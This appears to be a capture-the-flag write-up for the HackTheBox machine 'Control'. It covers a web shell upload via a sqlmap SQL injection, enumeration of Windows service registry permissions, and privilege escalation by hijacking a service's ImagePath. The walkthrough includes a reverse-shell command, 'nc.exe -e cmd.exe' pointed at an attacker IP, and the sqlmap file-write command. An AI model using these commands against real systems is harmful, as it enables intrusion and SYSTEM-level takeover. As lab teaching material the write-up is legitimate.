<pre><code class="lang-nohighlight">baud@kali:~/HTB/control$ sqlmap -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28' --file-write=./baud.php --file-dest='C:\\inetpub\\wwwroot\\uploads\\baud3.php'

<p>The shell is very simple and only has the purpose of giving me the ability to launch a different shell since I wasn’t able to execute OS commands from sqlmap itself using --os-cmd or --os-shell:</p>
<pre><code class="lang-auto">&lt;html&gt;

<p>While that output does not contain very interesting info it comes from a command we can re-use for further enumeration in the next phase, which is where the guess work bit begins.</p>
<hr>
<h2>Beginning of the guess work</h2>
<p>The box gave us a few hints, now it’s up to us to put all of them together and come up with an attack vector. Judging from his PowerShell history Hector was concerned with checking the ACL of the CurrentControlSet registry entries, so maybe, just maybe, some entries in there will have some interesting or non-standard permissions that we could take advantage of. This is our first assumption.</p>
<p>Arguably the most interesting entry within the CurrentControlSet child items is Services. All entries in the Services folder tell Windows how to manage the installed services, how to start them, when, with what privileges, and so on.</p>
<p>As we should already know, Windows services typically run under the <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="nofollow noopener">local SYSTEM</a> account unless they’ve been set to use a less privileged account, like the <a href="https://docs.microsoft.com/en-us/windows/win32/services/localservice-account" rel="nofollow noopener">local service</a> or the <a href="https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account" rel="nofollow noopener">network service</a> accounts.</p>
<p>Because of the very high privileges under which a lot of services run they make for very interesting targets. So let’s start enumerating the services this installation of Windows has enabled, simply by listing the child entries of the Services directory in the registry:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services &gt; svcs.txt

<p>Transfer the output file locally using nc since we have it available, for easier analysis:</p>

<p>With a list of the different service paths in the registry we can use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7" rel="nofollow noopener">Get-ACL</a> cmdlet that was also used by Hector to test a bunch of services for interesting permissions, I also pipe the output of the cmdlet to <em>fl</em>, which is an alias for <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/format-list?view=powershell-7" rel="nofollow noopener">Format List</a>, to avoid receiving a truncated output.</p>
<p>Of course this can be scripted very easily if you are not new to PowerShell, but because I suck at it I did it the manual way.</p>
<p>After trying out a few different services, you will eventually run into one that grants Hector full control access, like DeviceInstall:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; get-acl HKLM:\SYSTEM\CurrentControlset\Services\DeviceInstall | fl

<p>With those permissions DeviceInstall could make for an attackable service. Let’s query the registry for more information to see how a service entry looks like:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\DeviceInstall

<p>Out of all those keys, the one we are interested in is ImagePath. The ImagePath key tells Windows what command to execute when a service needs to be started. If we could change the ImagePath value of one of these services thanks to the permissions seen above and then start that service we would be able to execute arbitrary code as the local SYSTEM account.</p>
<p>Unfortunately, just because a registry ACL includes full control to Hector, it doesn’t mean we will be able to start that service. Hector is not a member of the Administrators group and so cannot arbitrarily shut down or restart services, we’re going to have to do some more trial and error to find some services we can control and which are also not running and we can start ourselves.</p>
<hr>
<h2>Privilege Escalation: Windows Service Hijack</h2>
<p>(improvised term)</p>
<p>The <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-service?view=powershell-7" rel="nofollow noopener">Get-Service</a> cmdlet comes to our aid, by using it to query a service we can tell whether that service is running or not:</p>
<pre><code class="lang-nohighlight">PS C:\Users\Hector\Documents&gt; get-service NetTcpPortSharing | fl
get-service NetTcpPortSharing | fl


Name                : NetTcpPortSharing
DisplayName         : Net.Tcp Port Sharing Service
Status              : Stopped
DependentServices   : {}
ServicesDependedOn  : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
ServiceType         : Win32ShareProcess
</code></pre>
<p>So services that can be queried with Get-Service and appear not to be running make for potential targets. Once again because Hector has limited permissions over services, only a portion of them can be queried with the cmdlet and this allows us to narrow down the number of targets to enumerate.</p>
<p>With some string manipulation we can turn the output file given to us earlier by the reg query command into a .ps1 script like this:</p>
<pre><code class="lang-nohighlight">Get-Service -Name ".NET CLR Data"
Get-Service -Name ".NET CLR Networking"
Get-Service -Name ".NET CLR Networking 4.0.0.0"
Get-Service -Name ".NET Data Provider for Oracle"
Get-Service -Name ".NET Data Provider for SqlServer"
Get-Service -Name ".NET Memory Cache 4.0"
Get-Service -Name ".NETFramework"
Get-Service -Name "1394ohci"
Get-Service -Name "3ware"
Get-Service -Name "ACPI"
Get-Service -Name "AcpiDev"

<p>Let’s see if we can start any of these stopped services. Most of them will give an error like this:</p>
<pre><code class="lang-nohighlight">PS C:\temp&gt; start-service ktmrm

</code></pre>
<p>But a few will not act so whiny, for example:</p>
<pre><code class="lang-nohighlight">PS C:\temp&gt; start-service pla

<p>That means the service is attackable because we can tell Windows to start it after overwriting the original registry value with our payload, which could simply be an nc.exe reverse shell, in that case <a href="https://ss64.com/nt/reg.html" rel="nofollow noopener"><em>reg add</em></a> is used to change a service’s ImagePath key like this:</p>
<pre><code class="lang-nohighlight">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\netsetupsvc /v ImagePath /D "C:\Users\Hector\Documents\nc.exe -e cmd.exe 10.10.15.203 7777"
</code></pre>
<p>Run Start-Service after the write operation and the payload will be executed:</p>

<p>This concludes the writeup for Control, I hope it was exhaustive, interesting, and comprehensible all at the same time.</p>
<p>Stay safe.</p>
